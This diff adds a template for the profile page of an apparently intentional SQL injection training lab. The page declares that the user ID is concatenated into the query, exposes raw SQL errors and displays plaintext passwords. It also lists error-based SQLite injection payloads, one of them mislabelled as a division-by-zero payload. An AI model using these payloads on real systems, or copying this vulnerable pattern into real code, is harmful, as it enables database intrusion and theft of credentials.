@@ -1,0 +1,71 @@
+{% extends "base.html" %}
+
+{% block title %}Profile - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">👤 User Profile</span>
+        <span class="badge badge-danger">Vulnerable: Error-Based SQLi</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This endpoint is vulnerable to <strong>Error-Based SQL Injection</strong>.
+        The user ID from the URL is directly concatenated into the query. Malformed input triggers SQL errors.
+    </p>
+    <div style="display: flex; gap: 12px; margin-bottom: 20px; flex-wrap: wrap;">
+        <a href="{{ url_for('profile', user_id='1') }}" class="btn btn-outline">Profile 1</a>
+        <a href="{{ url_for('profile', user_id='2') }}" class="btn btn-outline">Profile 2</a>
+        <a href="{{ url_for('profile', user_id='3') }}" class="btn btn-outline">Profile 3</a>
+        <a href="{{ url_for('profile', user_id="1'") }}" class="btn btn-outline" style="border-color: var(--warning); color: var(--warning);">Test Error (1')</a>
+    </div>
+    {% if executed_query %}
+    <div class="query-box">
+        <span class="label">Executed SQL Query</span>
+        <code>{{ executed_query }}</code>
+    </div>
+    {% endif %}
+    {% if error %}
+        <div class="alert alert-danger">
+            <strong>SQL Error (Information Leak):</strong><br>
+            {{ error }}
+        </div>
+    {% endif %}
+    {% if result %}
+    <div class="card" style="background: rgba(88, 166, 255, 0.05);">
+        <table class="data-table">
+            <tr><td style="width: 120px; color: var(--text-muted);">ID</td><td>{{ result.id }}</td></tr>
+            <tr><td style="color: var(--text-muted);">Username</td><td>{{ result.username }}</td></tr>
+            <tr><td style="color: var(--text-muted);">Password</td><td><code>{{ result.password }}</code></td></tr>
+            <tr><td style="color: var(--text-muted);">Email</td><td>{{ result.email }}</td></tr>
+            <tr><td style="color: var(--text-muted);">Role</td><td><span class="badge badge-info">{{ result.role }}</span></td></tr>
+            <tr><td style="color: var(--text-muted);">Created</td><td>{{ result.created_at }}</td></tr>
+        </table>
+    </div>
+    {% elif not error %}
+        <div class="alert alert-info">No user found with ID: {{ user_id }}</div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">💉 Error-Based SQLi Payloads</span>
+        <span class="badge badge-warning">Click to copy</span>
+    </div>
+    <div class="payload">
+        <div class="payload-label">Trigger syntax error to reveal query structure</div>
+        1'
+    </div>
+    <div class="payload">
+        <div class="payload-label">Column count discovery via UNION error</div>
+        1 AND 1=2 UNION SELECT null --
+    </div>
+    <div class="payload">
+        <div class="payload-label">Enumerate tables via error (SQLite)</div>
+        1 AND (SELECT CASE WHEN (substr(sql,1,1)='C') THEN 1/0 ELSE 1 END FROM sqlite_master WHERE type='table' LIMIT 1)=1
+    </div>
+    <div class="payload">
+        <div class="payload-label">Trigger division by zero for conditional errors</div>
+        1 AND 1=2 UNION SELECT null, null, null, null, null FROM sqlite_master --
+    </div>
+</div>
+{% endblock %}
